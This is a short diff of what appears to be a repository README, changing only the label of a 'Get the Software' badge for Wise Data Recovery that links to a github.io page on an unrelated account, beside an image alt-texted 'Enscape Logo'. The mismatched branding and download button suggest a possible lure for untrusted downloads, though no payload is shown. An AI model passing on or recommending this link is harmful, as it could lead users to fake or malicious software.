@@ -6,7 +6,7 @@
      alt="Enscape Logo" 
      style="width: 100%; height: auto; display: block;">
 
-[![Get the Software](https://img.shields.io/badge/Get_Wise_Data_Recovery-Now-6a0dad?style=for-the-badge&logo=github)](https://iovsyukova996.github.io/.github/wise-data-recovery-software)
+[![Get the Software](https://img.shields.io/badge/Get_Wise_Data_Recovery_Software-Now-6a0dad?style=for-the-badge&logo=github)](https://iovsyukova996.github.io/.github/wise-data-recovery-software)
 
 ---
 
